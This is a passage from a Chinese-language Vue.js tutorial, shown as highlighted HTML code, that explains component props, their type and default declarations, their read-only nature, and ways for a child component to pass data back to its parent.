</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>性别：{{sex}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;SiteUser&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 声明需要接收的属性
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">props</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;name&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;age&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;sex&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- App.vue --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">      在标签中，根据对应的 props 属性名称
</span></span></span><span class="line"><span class="cl"><span class="c">      使用Html属性键值对的方式将值传入
</span></span></span><span class="line"><span class="cl"><span class="c">     --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">SiteUser</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;张三&#34;</span> <span class="na">age</span><span class="o">=</span><span class="s">&#34;21&#34;</span> <span class="na">sex</span><span class="o">=</span><span class="s">&#34;男&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">SiteUser</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;李四&#34;</span> <span class="na">age</span><span class="o">=</span><span class="s">&#34;18&#34;</span> <span class="na">sex</span><span class="o">=</span><span class="s">&#34;女&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">SiteUser</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;王五&#34;</span> <span class="na">age</span><span class="o">=</span><span class="s">&#34;28&#34;</span> <span class="na">sex</span><span class="o">=</span><span class="s">&#34;男&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 引入组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">import</span> <span class="nx">SiteUser</span> <span class="nx">from</span> <span class="s1">&#39;./components/SiteUser.vue&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">SiteUser</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><hr>
<h1 id="属性值的传递" data-numberify>属性值的传递<a class="anchor ms-1" href="#属性值的传递"></a></h1>
<p>在组件标签中，使用键值对将属性作为<code>props</code>属性传递给组件时，默认传入的数据类型是作为字符串类型。这意味着使用默认的方式无法将值作为其它类型进行传递。</p>
<p>要传递其它类型的值，可以使用<code>v-bind</code>指令。这是因为<code>v-bind</code>指令会将属性的值作为表达式去执行并计算值。所以使用了<code>v-bind</code>指令就以为着可以为<code>props</code>属性传入不同类型的值。</p>
<p>如，将上例中的<code>age</code>作为<code>Number</code>类型传入：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">SiteUser</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;张三&#34;</span> <span class="na">:age</span><span class="o">=</span><span class="s">&#34;20 + 1&#34;</span> <span class="na">sex</span><span class="o">=</span><span class="s">&#34;男&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">SiteUser</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;李四&#34;</span> <span class="na">:age</span><span class="o">=</span><span class="s">&#34;18&#34;</span> <span class="na">sex</span><span class="o">=</span><span class="s">&#34;女&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">SiteUser</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;王五&#34;</span> <span class="na">:age</span><span class="o">=</span><span class="s">&#34;28&#34;</span> <span class="na">sex</span><span class="o">=</span><span class="s">&#34;男&#34;</span><span class="p">/&gt;</span>
</span></span></code></pre></div><hr>
<h1 id="定义方式" data-numberify>定义方式<a class="anchor ms-1" href="#定义方式"></a></h1>
<p><code>props</code>有3种定义方式：</p>
<ul>
<li>
<p>字符串数组形式（简单声明）：将所需传递的属性，作为字符串数组的元素进行声明。使用该方式进行声明的<code>props</code>属性，不限制传递的类型，不限制传递的必要性。</p>
<p>如上例中：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">props</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;name&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;age&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;sex&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">],</span>
</span></span></code></pre></div></li>
<li>
<p>仅类型限制形式：在传递的同时进行类型限制。如传递的类型不匹配，控制台会报错。</p>
<p>如上例，使用仅类型限制：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">age</span><span class="o">:</span> <span class="nb">Number</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// age: [Number, String], // 允许指定多种类型
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">sex</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span>
</span></span></code></pre></div></li>
<li>
<p>多限制形式：在传递的同时可以进行类型限制、必要性限制或默认值限制。</p>
<p>如上例，使用多限制：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">type</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span>   <span class="c1">// 类型限制
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="c1">// 必须传递（默认为 false）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">age</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">type</span><span class="o">:</span> <span class="nb">Number</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>     <span class="c1">// 设置默认值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">sex</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">type</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span>
</span></span></code></pre></div><blockquote>
<p>注：一般情况下，<code>required</code>设置为<code>true</code>时，就不使用<code>default</code>；在设置<code>required</code>或<code>required</code>为<code>false</code>时，最好使用<code>default</code>。</p>
</blockquote>
</li>
</ul>
<p><code>props</code>属性是只读的，Vue底层会对<code>props</code>属性进行监测，并限制其修改。对<code>props</code>的修改不一定会失败，但是如果进行了修改，Vue会在控制台发出警告。</p>
<p>如果业务需求确实需要修改<code>props</code>属性，可以在<code>data</code>属性或计算属性中添加<code>props</code>属性对应的不重名的拷贝，然后在<code>data</code>属性或计算属性之上对数据进行修改。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>姓名：{{myName}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;myAge &gt; 0&#34;</span><span class="p">&gt;</span>年龄：{{myAge}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>性别：{{mySex}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;changeSex&#34;</span><span class="p">&gt;</span>修改性别<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;SiteUser&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//  接收的同时对数据进行类型、必要性和默认值限制
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">type</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span>   <span class="c1">// 类型限制
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="c1">// 必须传递（默认为 false）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">age</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">type</span><span class="o">:</span> <span class="nb">Number</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="k">default</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>     <span class="c1">// 设置默认值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sex</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">type</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 可以重新定义不与 props 属性重名的 data 属性，以便操作数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">myName</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">myAge</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">age</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">mySex</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">sex</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">changeSex</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// props 属性可以修改，但是控制台会报错，也过不了语法检查
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// this.sex = this.sex === &#39;男&#39; ? &#39;女&#39; : &#39;男&#39;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">this</span><span class="p">.</span><span class="nx">mySex</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">mySex</span> <span class="o">===</span> <span class="s1">&#39;男&#39;</span> <span class="o">?</span> <span class="s1">&#39;女&#39;</span> <span class="o">:</span> <span class="s1">&#39;男&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>即，将<code>props</code>属性作为组件的初始化数据，对<code>data</code>属性或计算属性等内容进行初始化。组件中的数组载体还是以<code>data</code>属性或计算属性等为主。</p>
<blockquote>
<p>注：</p>
<ul>
<li><code>props</code>属性同样不可与<code>data</code>属性或计算属性中的属性名称相同。</li>
<li>如果<code>props</code>属性和<code>data</code>属性重名，<code>props</code>属性优先级更高。</li>
<li><code>props</code>属性不能使用被Vue征用了的标签属性。</li>
<li><code>props</code>属性不能修改是相对于组件而言的。在组件中，不要对当前组件的<code>props</code>属性进行修改，但是在使用组件时，可以对子组件的<code>props</code>属性通过<code>v-bind</code>指令进行动态数据绑定。</li>
<li>不要使用<code>v-model</code>绑定<code>props</code>属性。</li>
</ul>
</blockquote>
<hr>
<h1 id="子组件到父组件的数据通信" data-numberify>子组件到父组件的数据通信<a class="anchor ms-1" href="#子组件到父组件的数据通信"></a></h1>
<p>组件间数据的通信涉及以下内容：</p>
<ul>
<li>父组件到子组件的数据通信。</li>
<li>子组件到父组件的数据通信。</li>
<li>同级组件间的数据通信。</li>
</ul>
<p>父组件到子组件的通信直接通过<code>props</code>属性就可以实现。而子组件到父组件的通信，也可以通过<code>props</code>实现。</p>
<h2 id="修改对象类型的-prop" data-numberify>修改对象类型的 Prop<a class="anchor ms-1" href="#修改对象类型的-prop"></a></h2>
<p>Vue对<code>props</code>属性是一种浅层次的监测，Vue不会对<code>props</code>属性中的属性的改动进行监测。利用这一点可以在子组件中通过获取对象类型<code>props</code>属性值，然后利用<code>v-model</code>绑定该对象的属性来越过Vue的监测，从而实现子组件到父组件的通信。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  user-input.vue
</span></span></span><span class="line"><span class="cl"><span class="c"> --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 使用 v-model 直接修改 props 对象数据类型的属性中的属性 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> 
</span></span><span class="line"><span class="cl">    <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> 
</span></span><span class="line"><span class="cl">    <span class="na">v-model</span><span class="err">.</span><span class="na">lazy</span><span class="o">=</span><span class="s">&#34;user.account&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;账号&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> 
</span></span><span class="line"><span class="cl">    <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> 
</span></span><span class="line"><span class="cl">    <span class="na">v-model</span><span class="err">.</span><span class="na">lazy</span><span class="o">=</span><span class="s">&#34;user.password&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;密码&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;user-input&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">props</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;userInfo&#34;</span><span class="p">,</span> <span class="c1">// 将数据对象定义在父组件中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 利用 props 属性初始化，目的是防止报错
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">user</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  App.vue
</span></span></span><span class="line"><span class="cl"><span class="c"> --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">user-input</span> <span class="na">:userInfo</span><span class="o">=</span><span class="s">&#34;userInfo&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;login&#34;</span><span class="p">&gt;</span>登录<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">UserInput</span> <span class="nx">from</span> <span class="s1">&#39;./components/user-input.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">UserInput</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">userInfo</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">account</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">login</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">alert</span><span class="p">(</span><span class="sb">`账号：</span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">.</span><span class="nx">account</span><span class="si">}</span><span class="sb">\n密码：</span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">.</span><span class="nx">password</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>该方法其实就是子组件通过<code>props</code>，将用户在子组件中输入的数据，通过<code>v-model</code>双向绑定到父组件上。</p>
<p><strong>不建议使用这种方法实现</strong>，虽然修改对象类型的<code>props</code>属性中的属性不会报错（绕过了Vue的监测），但是这样操作违反了Vue的原则。</p>
<h2 id="传递函数类型的-prop" data-numberify>传递函数类型的 Prop<a class="anchor ms-1" href="#传递函数类型的-prop"></a></h2>
<p>借助<code>props</code>将父组件中的某些方法传递到子组件中，然后在子组件中通过调用这些从父组件传递过来的<code>props</code>方法来实现子组件到父组件的通信。</p>
<p>例如有一个<code>user-input</code>组件来收集用户的账号和密码信息，而<code>App.vue</code>需要获取<code>user-input</code>组件收集到的用户信息：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  user-input.vue
</span></span></span><span class="line"><span class="cl"><span class="c"> --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> 
</span></span><span class="line"><span class="cl">    <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> 
</span></span><span class="line"><span class="cl">    <span class="na">v-model</span><span class="err">.</span><span class="na">lazy</span><span class="o">=</span><span class="s">&#34;userInfo.account&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;账号&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> 
</span></span><span class="line"><span class="cl">    <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> 
</span></span><span class="line"><span class="cl">    <span class="na">v-model</span><span class="err">.</span><span class="na">lazy</span><span class="o">=</span><span class="s">&#34;userInfo.password&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;密码&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;user-input&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">props</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;setUserInfo&#34;</span><span class="p">,</span>  <span class="c1">// 从父组件接收一个用于通知父组件数据更新的函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">userInfo</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">account</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">watch</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 监听 userInfo 对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">userInfo</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">deep</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">handler</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 通知父组件 userInfo 被更新
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">this</span><span class="p">.</span><span class="nx">setUserInfo</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
